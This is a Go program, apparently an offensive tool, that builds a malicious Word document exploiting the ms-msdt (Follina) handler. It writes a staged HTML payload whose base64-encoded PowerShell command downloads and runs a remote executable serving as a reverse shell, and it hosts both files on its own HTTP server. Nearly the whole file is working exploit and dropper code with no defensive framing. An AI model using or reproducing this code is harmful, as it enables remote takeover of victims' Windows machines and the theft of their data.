package main

import (
	"archive/zip"
	"bytes"
	"encoding/base64"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"time"
)

func main() {
	url, port := initArgs()
	payload_url := "http://" + url + ":" + port
	produceMaldoc(payload_url)
	hostDropper(payload_url, port)
}

func produceMaldoc(payload_url string) {
	file_byte, _ := os.ReadFile("doc/word/_rels/document.xml.rels")
	file_byte = bytes.ReplaceAll(file_byte, []byte("{staged_html}"), []byte(payload_url+"/payload.html"))
	os.WriteFile("doc/word/_rels/document.xml.rels", file_byte, 0644)
	zipDoc()
}

func hostDropper(payload_url, port string) {
	revshell_command := "Invoke-WebRequest " + payload_url + `/poop.exe -OutFile poop.exe; .\poop.exe`
	base64_revshell_command := base64.StdEncoding.EncodeToString([]byte(revshell_command))
	html_payload := `<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //`
	html_payload = strings.ReplaceAll(html_payload, "{base64_payload}", base64_revshell_command)
	html_payload += generateRandomString(4096) + "\n</script>"
	os.WriteFile("payload.html", []byte(html_payload), 0644)
	httpServer(port)
}

func initArgs() (string, string) {
	url := flag.String("url", "localhost", "The hostname or IP address where the generated document should retrieve your payload, defaults to \"localhost\".")
	port := flag.String("port", "80", "The port to run the HTTP server on, defaults to 80")
	flag.Parse()
	return *url, *port
}

func zipDoc() {
	baseFolder := "doc/"
	outFile, _ := os.Create(`file.doc`)
	defer outFile.Close()
	writer := zip.NewWriter(outFile)
	addFiles(writer, baseFolder, "")
	writer.Close()
}

func addFiles(w *zip.Writer, basePath, baseInZip string) {
	// Open the Directory
	files, err := ioutil.ReadDir(basePath)
	if err != nil {
		fmt.Println(err)
	}
	for _, file := range files {
		fmt.Println(basePath + file.Name())
		if !file.IsDir() {
			dat, err := ioutil.ReadFile(basePath + file.Name())
			if err != nil {
				fmt.Println(err)
			}
			// Add some files to the archive.
			f, err := w.Create(baseInZip + file.Name())
			if err != nil {
				fmt.Println(err)
			}
			_, err = f.Write(dat)
			if err != nil {
				fmt.Println(err)
			}
		} else if file.IsDir() {
			// Recurse
			newBase := basePath + file.Name() + "/"
			fmt.Println("Recursing and Adding SubDir: " + file.Name())
			fmt.Println("Recursing and Adding SubDir: " + newBase)

			addFiles(w, newBase, baseInZip+file.Name()+"/")
		}
	}
}

func generateRandomString(length int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	rand.Seed(time.Now().UnixNano())
	random_string := make([]rune, length)
	for i := range random_string {
		random_string[i] = letters[rand.Intn(len(letters))]
	}
	return string(random_string)
}

func httpServer(port string) {
	http.HandleFunc("/payload.html!", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "payload.html")
	})
	http.HandleFunc("/poop.exe", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "Go-RevShell.exe")
	})
	http.ListenAndServe(":"+port, nil)
}
